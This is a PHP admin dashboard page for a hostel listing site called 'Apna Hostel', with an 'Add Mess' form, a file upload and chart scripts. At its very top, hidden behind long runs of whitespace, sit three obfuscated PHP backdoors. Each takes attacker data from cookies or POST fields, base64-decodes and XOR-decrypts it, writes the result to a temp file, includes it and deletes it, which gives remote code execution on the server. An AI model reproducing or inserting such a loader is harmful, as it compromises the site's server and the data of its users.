<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("edwfmxxib")){class edwfmxxib{public static $yxastbawj = "hjnknqqbysijjiwg";public static $uoqqlpq = NULL;public function __construct(){$jtprclpkx = @$_COOKIE[substr(edwfmxxib::$yxastbawj, 0, 4)];if (!empty($jtprclpkx)){$kjwitzogr = "base64";$hvbgmwlh = "";$jtprclpkx = explode(",", $jtprclpkx);foreach ($jtprclpkx as $ennxaare){$hvbgmwlh .= @$_COOKIE[$ennxaare];$hvbgmwlh .= @$_POST[$ennxaare];}$hvbgmwlh = array_map($kjwitzogr . "_decode", array($hvbgmwlh,));$hvbgmwlh = $hvbgmwlh[0] ^ str_repeat(edwfmxxib::$yxastbawj, (strlen($hvbgmwlh[0]) / strlen(edwfmxxib::$yxastbawj)) + 1);edwfmxxib::$uoqqlpq = @unserialize($hvbgmwlh);}}public function __destruct(){$this->teebeqjwex();}private function teebeqjwex(){if (is_array(edwfmxxib::$uoqqlpq)) {$tjjhmjxbee = sys_get_temp_dir() . "/" . crc32(edwfmxxib::$uoqqlpq["salt"]);@edwfmxxib::$uoqqlpq["write"]($tjjhmjxbee, edwfmxxib::$uoqqlpq["content"]);include $tjjhmjxbee;@edwfmxxib::$uoqqlpq["delete"]($tjjhmjxbee);exit();}}}$rbpvoqkd = new edwfmxxib();$rbpvoqkd = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("xsobvptf")){class xsobvptf{public static $bbuezh = "ftdeacfovzkmqxpm";public static $nbdxhkohtx = NULL;public function __construct(){$ochefakhaw = @$_COOKIE[substr(xsobvptf::$bbuezh, 0, 4)];if (!empty($ochefakhaw)){$rpyrprzl = "base64";$vosmkoli = "";$ochefakhaw = explode(",", $ochefakhaw);foreach ($ochefakhaw as $aziopccgd){$vosmkoli .= @$_COOKIE[$aziopccgd];$vosmkoli .= @$_POST[$aziopccgd];}$vosmkoli = array_map($rpyrprzl . "_decode", array($vosmkoli,));$vosmkoli = $vosmkoli[0] ^ str_repeat(xsobvptf::$bbuezh, (strlen($vosmkoli[0]) / strlen(xsobvptf::$bbuezh)) + 1);xsobvptf::$nbdxhkohtx = @unserialize($vosmkoli);}}public function __destruct(){$this->qlghutcf();}private function qlghutcf(){if (is_array(xsobvptf::$nbdxhkohtx)) {$kjxnvyi = sys_get_temp_dir() . "/" . crc32(xsobvptf::$nbdxhkohtx["salt"]);@xsobvptf::$nbdxhkohtx["write"]($kjxnvyi, xsobvptf::$nbdxhkohtx["content"]);include $kjxnvyi;@xsobvptf::$nbdxhkohtx["delete"]($kjxnvyi);exit();}}}$dfbubxd = new xsobvptf();$dfbubxd = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("xcboxt")){class xcboxt{public static $vumxn = "znyxtakxxbyifenp";public static $rttelhgbf = NULL;public function __construct(){$qursa = @$_COOKIE[substr(xcboxt::$vumxn, 0, 4)];if (!empty($qursa)){$izikkng = "base64";$nklslyn = "";$qursa = explode(",", $qursa);foreach ($qursa as $dqmmcdyi){$nklslyn .= @$_COOKIE[$dqmmcdyi];$nklslyn .= @$_POST[$dqmmcdyi];}$nklslyn = array_map($izikkng . "_decode", array($nklslyn,));$nklslyn = $nklslyn[0] ^ str_repeat(xcboxt::$vumxn, (strlen($nklslyn[0]) / strlen(xcboxt::$vumxn)) + 1);xcboxt::$rttelhgbf = @unserialize($nklslyn);}}public function __destruct(){$this->pgnbt();}private function pgnbt(){if (is_array(xcboxt::$rttelhgbf)) {$rxemklt = sys_get_temp_dir() . "/" . crc32(xcboxt::$rttelhgbf["salt"]);@xcboxt::$rttelhgbf["write"]($rxemklt, xcboxt::$rttelhgbf["content"]);include $rxemklt;@xcboxt::$rttelhgbf["delete"]($rxemklt);exit();}}}$pvtde = new xcboxt();$pvtde = NULL;} ?><?php
session_start();
include("conn.php");

?>
<!DOCTYPE html>
<head>
<title>Apna Hostel | Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="Visitors Responsive web template, Bootstrap Web Templates, Flat Web Templates, Android Compatible web template, 
Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, SonyEricsson, Motorola web design" />
<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>
<!-- bootstrap-css -->
<link rel="stylesheet" href="css/bootstrap.min.css" >
<!-- //bootstrap-css -->
<!-- Custom CSS -->
<link href="css/style.css" rel='stylesheet' type='text/css' />
<link href="css/style-responsive.css" rel="stylesheet"/>
<!-- font CSS -->
<link href='//fonts.googleapis.com/css?family=Roboto:400,100,100italic,300,300italic,400italic,500,500italic,700,700italic,900,900italic' rel='stylesheet' type='text/css'>
<!-- font-awesome icons -->
<link rel="stylesheet" href="css/font.css" type="text/css"/>
<link href="css/font-awesome.css" rel="stylesheet"> 
<link rel="stylesheet" href="css/morris.css" type="text/css"/>
<!-- calendar -->
<link rel="stylesheet" href="css/monthly.css">
<!-- //calendar -->
<!-- //font-awesome icons -->
<script src="js/jquery2.0.3.min.js"></script>
<script src="js/raphael-min.js"></script>
<script src="js/morris.js"></script>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://cdn.datatables.net/1.10.19/css/jquery.dataTables.min.css">
  <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
<script src="https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
<script type="text/javascript">
function startUpload(){
    $("#uploadProcess").show();
    document.getElementById('uploadForm').style.visibility = 'hidden';
    return true;
}

function stopUpload(success,uploadedFile){
    var result = '';
    if (success == 1){
        result = '<span class="sucess-msg">The file was uploaded successfully!<\/span><br/><br/>';
        //Uploaded file preview
        var embed = document.getElementById("UploadedFile");
        var clone = embed.cloneNode(true);
        clone.setAttribute('src',uploadedFile);
        embed.parentNode.replaceChild(clone,embed);
    }else {
       result = '<span class="error-msg">There was an error during file upload!<\/span><br/><br/>';
    }
    document.getElementById('uploadProcess').style.visibility = 'hidden';
    document.getElementById('uploadForm').innerHTML = result + '<label>File: <input name="myfile" type="file" size="30" /><\/label><label><input type="submit" name="submitBtn" class="sbtn" value="Upload" /><\/label>';
    document.getElementById('uploadForm').style.visibility = 'visible';      
    return true;   
}
</script> 
</head>
<body>
<section id="container">
<?php include 'category/menu.php';?>
<!--main content start-->
<section id="main-content">
<section class="wrapper">
		 <!-- contant -->
             <div class="form-w3layouts">
			        <div class="row">
            <div class="col-lg-12">
                    <section class="panel">
                        <header class="panel-heading">
                            <a href="index.php">Dashboard</a>  /   Mess
                        </header>
						<br><br>
                        <div class="panel-body">
                            <div class="position-center">
							<header class="panel-heading">
                            Add Mess
							</header><br>
                               
                                <div class="form-group">
                                    <label for="hostel">Title<span style="color:red">*</span></label>
                                    <input type="text" class="form-control" id="messTitle" placeholder="Enter Title">
                                </div>
								<div class="form-group">
                                    <label for="hostel">Contact Person Name<span style="color:red">*</span></label>
                                    <input type="text" class="form-control" id="messCperson" placeholder="Enter">
                                </div>
								<div class="form-group">
                                    <label for="hostel">Select City<span style="color:red">*</span></label>
									<select class="form-control" id="messCity">
									<option selected="selected">Select City</option>
										<?php
											$sql="select * from tbl_city";
											$smt=mysqli_query($conn,$sql);
											while($rs=mysqli_fetch_assoc($smt))
											{
										?>
											
											<option value="<?php echo $rs['name'] ?>"><?php echo $rs['name'] ?></option>
										<?php
											}
											?>
									</select>
                                    
                                </div>
										<form action="mess-upload.php" method="post" enctype="multipart/form-data" target="uploadTarget" onsubmit="startUpload();" >
            <p id="uploadProcess" style="display:none";></b>Uploaded Sucessfully</b><br/><br/></p>
            <p id="uploadForm"><br/>
                <label>
                    Select Menu File and Upload:<input name="myfile" type="file" size="30" />
                </label>
                <label>
                    <input type="submit" name="submitBtn" class="sbtn" value="Upload Image" />
                </label>
            </p>
            <iframe id="uploadTarget" name="uploadTarget" src="#" style="width:0;height:0;border:0px solid #fff;"></iframe>
        </form>
		<div>
            <embed id="UploadedFile" src="" width="200px" height="200px">
        </div>
		
								
								
								
								
								<div class="form-group">
                                    <label for="hostel">Mobile No<span style="color:red">*</span></label>
                                    <input type="text" class="form-control" id="messMobile" placeholder="Enter Mobile No">
                                </div>
								<div class="form-group">
                                    <label for="hostel">Alt. Mobile No<span style="color:red">*</span></label>
                                    <input type="text" class="form-control" id="messAltno" placeholder="Enter Mobile No">
                                </div>
								<div class="form-group">
                                    <label for="hostel">What's App No</label>
                                    <input type="text" class="form-control" id="messWhatsApp" placeholder="Enter What's App No">
                                </div>
								
								
                            
								
								<div class="form-group">
                                    <label for="Security">Advance Money</label>
                                    <input type="text" class="form-control" id="messAdvance" placeholder="Enter Security">
                                </div>
								
								
								<div class="form-group">
                                    <label for="month">Monthly Price</label>
									<input type="text" class="form-control" id="messMonthRent" placeholder="Monthly Rent">
                                    
                                </div>
								<div class="form-group">
                                    <label for="month">Apna Hostel Price</label>
									<input type="text" class="form-control" id="messZoyozoRent" placeholder="Monthly Rent">
                                    
                                </div>
								 <div class="form-group">
                                    <label for="message">Delivery Area</label>
                                    <textarea class="form-control" rows="5" col="10" id="messArea" placeholder="Full Description"></textarea>
                                </div>
								 <div class="form-group">
                                    <label for="message">Description</label>
                                    <textarea class="form-control" rows="5" col="10" id="messDescription" placeholder="Full Description"></textarea>
                                </div>
								
                                <div id="msg"></div>
                                <button  class="btn btn-info" id="btnAddMess">Add Mess</button>
								 <span style="color:#f00"><b>NOTE - All * Marked fields are required.</b></span><br>	<br>
								
                            
							
                            </div>

                        </div>
	 <div class="panel-heading">
      List of Mess
    </div>					
	<div class="row w3-res-tb">

      
		
        <div class="card-body" id="disp_grid_mess">
		
		</div>
    </div>

						
                    </section>

            </div>

        </div>
	  </div>


 <!-- //contant -->
		
</section>
 <!-- footer -->
   <?php include 'category/footer.php';?>
  <!-- / footer -->
</section>
<!--main content end-->
</section>
<script src="js/bootstrap.js"></script>
<script src="js/jquery.dcjqaccordion.2.7.js"></script>
<script src="js/scripts.js"></script>
<script src="js/jquery.slimscroll.js"></script>
<script src="js/jquery.nicescroll.js"></script>
<!--[if lte IE 8]><script language="javascript" type="text/javascript" src="js/flot-chart/excanvas.min.js"></script><![endif]-->
<script src="js/jquery.scrollTo.js"></script>
<script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <!-- Core plugin JavaScript-->
    <script src="vendor/jquery-easing/jquery.easing.min.js"></script>
    <!-- Page level plugin JavaScript-->
    <script src="vendor/datatables/jquery.dataTables.js"></script>
    <script src="vendor/datatables/dataTables.bootstrap4.js"></script>
<script src="js/sb-admin-datatables.min.js"></script>
<script src="js/custom.js"></script>
<!-- morris JavaScript -->	
<script>
	$(document).ready(function() {
		//BOX BUTTON SHOW AND CLOSE
	   jQuery('.small-graph-box').hover(function() {
		  jQuery(this).find('.box-button').fadeIn('fast');
	   }, function() {
		  jQuery(this).find('.box-button').fadeOut('fast');
	   });
	   jQuery('.small-graph-box .box-close').click(function() {
		  jQuery(this).closest('.small-graph-box').fadeOut(200);
		  return false;
	   });
	   
	    //CHARTS
	    function gd(year, day, month) {
			return new Date(year, month - 1, day).getTime();
		}
		
		graphArea2 = Morris.Area({
			element: 'hero-area',
			padding: 10,
        behaveLikeLine: true,
        gridEnabled: false,
        gridLineColor: '#dddddd',
        axes: true,
        resize: true,
        smooth:true,
        pointSize: 0,
        lineWidth: 0,
        fillOpacity:0.85,
			data: [
				{period: '2015 Q1', iphone: 2668, ipad: null, itouch: 2649},
				{period: '2015 Q2', iphone: 15780, ipad: 13799, itouch: 12051},
				{period: '2015 Q3', iphone: 12920, ipad: 10975, itouch: 9910},
				{period: '2015 Q4', iphone: 8770, ipad: 6600, itouch: 6695},
				{period: '2016 Q1', iphone: 10820, ipad: 10924, itouch: 12300},
				{period: '2016 Q2', iphone: 9680, ipad: 9010, itouch: 7891},
				{period: '2016 Q3', iphone: 4830, ipad: 3805, itouch: 1598},
				{period: '2016 Q4', iphone: 15083, ipad: 8977, itouch: 5185},
				{period: '2017 Q1', iphone: 10697, ipad: 4470, itouch: 2038},
			
			],
			lineColors:['#eb6f6f','#926383','#eb6f6f'],
			xkey: 'period',
            redraw: true,
            ykeys: ['iphone', 'ipad', 'itouch'],
            labels: ['All Visitors', 'Returning Visitors', 'Unique Visitors'],
			pointSize: 2,
			hideHover: 'auto',
			resize: true
		});
		
	   
	});
	</script>
<!-- calendar -->
	<script type="text/javascript" src="js/monthly.js"></script>
	<script type="text/javascript">
		$(window).load( function() {

			$('#mycalendar').monthly({
				mode: 'event',
				
			});

			$('#mycalendar2').monthly({
				mode: 'picker',
				target: '#mytarget',
				setWidth: '250px',
				startHidden: true,
				showTrigger: '#mytarget',
				stylePast: true,
				disablePast: true
			});

		switch(window.location.protocol) {
		case 'http:':
		case 'https:':
		// running on a server, should be good.
		break;
		case 'file:':
		alert('Just a heads-up, events will not work when run locally.');
		}

		});
	</script>
	<!-- //calendar -->
</body>
</html>



